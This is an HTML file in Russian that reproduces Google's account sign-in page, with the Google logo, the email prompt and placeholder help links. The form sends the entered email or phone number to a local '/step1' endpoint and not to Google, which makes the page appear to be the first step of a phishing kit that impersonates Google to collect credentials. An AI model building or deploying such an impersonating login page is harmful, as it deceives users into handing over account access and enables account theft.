<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Вход – аккаунты Google</title>
<link rel="icon" type="image/svg+xml" href="/static/google_logo.svg">
<link rel="stylesheet" href="/static/style.css">
<script>
  (function() {
    var saved = localStorage.getItem('theme');
    if (saved) document.documentElement.setAttribute('data-theme', saved);
  })();
</script>
</head>
<body>

  <div class="main">
    <img class="logo" src="/static/google_logo.svg" alt="Google">

    <h1>Вход</h1>
    <p class="sub">Используйте аккаунт Google</p>

    <form action="/step1" method="POST" autocomplete="off">
      <input type="text" name="email" required autofocus placeholder="Телефон или электронный адрес">
      <a class="link" href="#">Забыли адрес электронной почты?</a>

      <p class="hint">
        Не ваш компьютер? Включите гостевой режим,
        чтобы защитить данные в аккаунте.
        <a href="#">Подробнее об использовании гостевого режима</a>
      </p>

      <div class="actions">
        <a class="create" href="#">Создать аккаунт</a>
        <button type="submit">Далее</button>
      </div>
    </form>
  </div>

  <footer class="footer">
    <div class="footer-row">
      <div class="footer-left">
        <a href="#">Русский</a>
        <span class="lang-arrow">▼</span>
      </div>
      <div class="footer-right">
        <a href="#">Справка</a>
        <a href="#">Конфиденциальность</a>
        <a href="#">Условия</a>
      </div>
    </div>
  </footer>

</body>
</html>
